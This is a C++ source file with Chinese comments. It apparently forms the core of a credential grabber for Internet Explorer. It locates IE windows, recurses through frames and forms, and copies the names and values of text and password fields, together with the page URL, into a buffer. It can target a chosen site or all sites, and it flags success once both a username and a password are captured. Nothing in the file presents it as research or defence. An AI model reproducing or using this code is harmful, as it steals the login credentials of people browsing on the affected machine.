
#include "StdAfx.h"
#include <mshtml.h>
#include <atlcomcli.h>
#include <atlbase.h>
#include "ie.h"


void EnumForm( IHTMLDocument2 * pIHTMLDocument2 );



char g_szAddr[256];
char* g_strRet;
bool g_ret;






void EnumFrame( IHTMLDocument2 * pIHTMLDocument2 )
{
	if ( !pIHTMLDocument2 )	return;

	HRESULT hr;

	CComPtr< IHTMLFramesCollection2 > spFramesCollection2;
	pIHTMLDocument2->get_frames( &spFramesCollection2 );	//取得框架frame的集合

	if(spFramesCollection2 == NULL)
		return ;
	long nFrameCount=0;				//取得子框架个数
	hr = spFramesCollection2->get_length( &nFrameCount );
	if ( FAILED ( hr ) || 0 == nFrameCount )	return;

	for(long i=0; i<nFrameCount; i++)
	{
		CComVariant vDispWin2;		//取得子框架的自动化接口
		hr = spFramesCollection2->item( &CComVariant(i), &vDispWin2 );
		if ( FAILED ( hr ) )	continue;

		CComQIPtr< IHTMLWindow2 > spWin2 = vDispWin2.pdispVal;
		if( !spWin2 )	continue;	//取得子框架的 IHTMLWindow2 接口

		CComPtr < IHTMLDocument2 > spDoc2;
		spWin2->get_document( &spDoc2 );	//取得字框架的 IHTMLDocument2 接口

		EnumForm( spDoc2 );			//递归枚举当前子框架 IHTMLDocument2 上的表单form
	}
}

void EnumForm( IHTMLDocument2 * pIHTMLDocument2 )
{
	if( !pIHTMLDocument2 )	return;

	EnumFrame( pIHTMLDocument2 );	//递归枚举当前 IHTMLDocument2 上的子框架fram

	HRESULT hr;
	CComBSTR bstrTitle;
	pIHTMLDocument2->get_title( &bstrTitle );	//取得文档标题

	USES_CONVERSION;
	//cout << _T("====================") << endl;
	//cout << _T("开始枚举“") << OLE2CT( bstrTitle ) << _T("”的表单") << endl;
	//cout << _T("====================") << endl;

	CComQIPtr< IHTMLElementCollection > spElementCollection;
	hr = pIHTMLDocument2->get_forms( &spElementCollection );	//取得表单集合
	if ( FAILED( hr ) )
	{
//		cout << _T("获取表单的集合 IHTMLElementCollection 错误") << endl;
		return;
	}



	long nFormCount=0;				//取得表单数目
	hr = spElementCollection->get_length( &nFormCount );
	if ( FAILED( hr ) )
	{
//		cout << _T("获取表单数目错误") << endl;
		return;
	}
	
	bool bUser = false, bPass = false;
	for(long i=0; i<nFormCount; i++)
	{
		IDispatch *pDisp = NULL;	//取得第 i 项表单
		hr = spElementCollection->item( CComVariant( i ), CComVariant(), &pDisp );
		if ( FAILED( hr ) )		continue;

		CComQIPtr< IHTMLFormElement > spFormElement = pDisp;
		pDisp->Release();

		long nElemCount=0;			//取得表单中 域 的数目
		hr = spFormElement->get_length( &nElemCount );
		if ( FAILED( hr ) )		continue;

		for(long j=0; j<nElemCount; j++)
		{
			CComDispatchDriver spInputElement;	//取得第 j 项表单域
			hr = spFormElement->item( CComVariant( j ), CComVariant(), &spInputElement );
			if ( FAILED( hr ) )	continue;

			if(spInputElement == NULL)
				break;
			CComVariant vName,vVal,vType;		//取得表单域的 名，值，类型
			hr = spInputElement.GetPropertyByName( L"name", &vName );
			if( FAILED( hr ) )	continue;
			hr = spInputElement.GetPropertyByName( L"value", &vVal );
			if( FAILED( hr ) )	continue;
			hr = spInputElement.GetPropertyByName( L"type", &vType );
			if( FAILED( hr ) )	continue;

			char* lpName = vName.bstrVal?
					OLE2CA( vName.bstrVal ) : "NULL";	//未知域名
			char* lpVal  = vVal.bstrVal?
					OLE2CA( vVal.bstrVal  ) : "";	//空值，未输入
			char* lpType = vType.bstrVal?
					OLE2CA( vType.bstrVal ) : "NULL";	//未知类型

			if( !( strlen(lpVal) < 4 || strlen(lpVal) > 16) )
			if((stricmp(lpType, "texT") == 0) || (stricmp(lpType, "passworD") == 0))
			{
				char szRet[300] = "";
			//	strcat(szRet, lpType);
			//	strcat(szRet, "--");
				strcat(szRet, lpName);
				strcat(szRet, ":");
				strcat(szRet, lpVal);
				strcat(szRet, "\r\n");
				strcat(g_strRet, szRet);
				if(stricmp(lpType, "passworD") == 0)
					bPass = true;
				else
					bUser = true;
				if( bPass && bUser) 
					g_ret = true;
			}

	//		cout << _T("[") << lpType << _T("] ");
	//		cout << lpName << _T(" = ") << lpVal << endl;
		}
		//想提交这个表单吗？删除下面语句的注释吧
		//pForm->submit();
	}
}



/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

BOOL CALLBACK EnumChildProc(HWND hwnd,LPARAM lParam)
{
	TCHAR buf[100];
	
	::GetClassName( hwnd, (LPTSTR)&buf, 100 );
	if ( _tcscmp( buf, _T("Internet Explorer_Server") ) == 0 ) \
		
	{
		*(HWND*)lParam = hwnd;
		return FALSE;
	}
	else
		return TRUE;
};

/////////////////////////////////////////////////////////////////////////////
// CGetIhtmlDlg dialog
//You can store the interface pointer in a member variable 
//for easier access
//Modified by Chu Fang
/*函数名:GetDocInterface
  参数:hWnd,WebBrowser控件的窗口句柄
  功能:通过WM_HTML_GETOBJECT取得控件的IHTMLDocument2接口
*/
IHTMLDocument2* GetDocInterface(HWND hWnd) 
{
	
	CComPtr<IHTMLDocument2> spDoc=NULL;
	// Explicitly load MSAA so we know if it''s installed
	HINSTANCE hInst = ::LoadLibrary( _T("OLEACC.DLL") );
	if ( hInst != NULL )
	{
		if ( hWnd != NULL )
		{
			HWND hWndChild=NULL;
			// Get 1st document window
			::EnumChildWindows( hWnd, EnumChildProc, (LPARAM)&hWndChild );
			if ( hWndChild )
			{
				
				LRESULT lRes;
				
				UINT nMsg = ::RegisterWindowMessage( _T("WM_HTML_GETOBJECT") );
				::SendMessageTimeout( hWndChild, nMsg, 0L, 0L, SMTO_ABORTIFHUNG, 1000, (DWORD*)&lRes );
				
				LPFNOBJECTFROMLRESULT pfObjectFromLresult = (LPFNOBJECTFROMLRESULT)::GetProcAddress( hInst, "ObjectFromLresult" );
				if ( pfObjectFromLresult != NULL )
				{
				
						HRESULT hr;
						hr = (*pfObjectFromLresult)( lRes, IID_IHTMLDocument, 0, (void**)&spDoc );
						if ( SUCCEEDED(hr) )
						{
							CComPtr<IDispatch> spDisp;
							CComQIPtr<IHTMLWindow2> spWin;
							try
							{
								
								spDoc->get_Script( &spDisp );
							}
							catch(...)
							{
								return NULL;
							}
							try
							{
								spWin = spDisp;
								if( spWin )
									spWin->get_document( &spDoc.p );
								else
									return NULL;
							// Change background color to red
						//	spDoc->put_bgColor( CComVariant("red") );
							}
							catch(...)
							{
								return NULL;
							}
						}
					
				}
				
			} // else document not ready
			else
				return NULL;
			
		} // else Internet Explorer is not running
		::FreeLibrary( hInst );
		
	} // else Active Accessibility is not installed
	//得到ARRD
	return spDoc;
}


bool GetIeInfo(HWND hwnd, char* strRet, char* szAddr)
{

	g_ret = false;
	CComQIPtr<IHTMLDocument2, &IID_IHTMLDocument2> pDoc2;
	try
	{
		pDoc2 = GetDocInterface(hwnd);

		CComBSTR bstrUrl;
		if(pDoc2)
			pDoc2->get_URL(&bstrUrl);
		else
			return false;

		g_strRet = strRet;
		char szAddrBak[2000] = "";
		char szAddrBak2[2000] = "";
		strcpy(szAddrBak, (char*)CW2A(bstrUrl));
		strcpy(szAddrBak2, szAddr);
		_strlwr(szAddrBak);
		_strlwr(szAddrBak2);
		if( (strstr( szAddrBak, szAddrBak2) != NULL) || strcmp("ALL", szAddr) == 0)
		{
			//只复制域名前三十个字母
			strcpy(g_strRet, (char*)CW2A(bstrUrl));
			strcat(g_strRet, "\r\n");

			EnumForm(pDoc2);
		}
//		else
//			return false;
	}
	catch(...)
	{
		return false;
	}
	return g_ret;
}


